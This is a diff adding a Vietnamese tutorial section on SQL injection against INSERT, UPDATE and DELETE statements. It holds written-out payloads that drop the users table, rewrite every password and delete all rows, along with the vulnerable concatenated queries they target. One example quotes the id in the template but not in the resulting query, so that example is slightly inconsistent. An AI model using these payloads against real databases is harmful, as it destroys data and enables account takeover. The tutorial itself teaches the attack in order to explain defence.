@@ -405,6 +405,73 @@ Một lúc sau, sẽ thấy có các request DNS/HTTP trả về từ server. Tr
 - Vào mục My account, đăng nhập với username administrator và mật khẩu vừa lấy được → Đăng nhập thành công.
 <img width="1862" height="803" alt="image" src="https://github.com/user-attachments/assets/682dfce8-1eb7-45b6-8a7f-1a1827c4cda1" />
 
+## SQL Injection trên các truy vấn INSERT, UPDATE, DELETE
+
+### SQL Injection trên câu lệnh INSERT
+Ví dụ ứng dụng cho phép người dùng đăng ký tài khoản:
+
+```sql
+INSERT INTO users (username, password, email)
+VALUES ('$username', '$password', '$email');
+```
+
+Nếu không kiểm tra dữ liệu nhập, kẻ tấn công có thể chèn payload vào trường `username`:
+
+```sql
+' , 'abc', 'attacker@mail.com'); DROP TABLE users; --
+```
+
+Câu lệnh trở thành:
+
+```sql
+INSERT INTO users (username, password, email)
+VALUES ('', 'abc', 'attacker@mail.com'); DROP TABLE users; --', '123');
+```
+
+> Bảng `users` có thể bị xóa.
+
+### SQL Injection trên câu lệnh UPDATE
+Ví dụ ứng dụng cho phép người dùng đổi mật khẩu:
+
+```sql
+UPDATE users SET password='$new_password' WHERE username='$username';
+```
+
+Payload:
+
+```sql
+attacker' OR '1'='1
+```
+
+Câu lệnh trở thành:
+
+```sql
+UPDATE users SET password='newpass' WHERE username='attacker' OR '1'='1';
+```
+
+> Toàn bộ mật khẩu của tất cả tài khoản có thể bị thay đổi.
+
+### SQL Injection trên câu lệnh DELETE
+Ví dụ ứng dụng có chức năng xóa người dùng:
+
+```sql
+DELETE FROM users WHERE id='$id';
+```
+
+Nếu đầu vào `id` không được kiểm soát, kẻ tấn công nhập:
+
+```sql
+1 OR 1=1
+```
+
+Câu lệnh trở thành:
+
+```sql
+DELETE FROM users WHERE id=1 OR 1=1;
+```
+
+> Toàn bộ dữ liệu trong bảng `users` bị xóa.
+
 ## 3. Các biện pháp phòng chống SQL Injection
 
 Để tránh SQL Injection, có thể áp dụng các biện pháp sau:
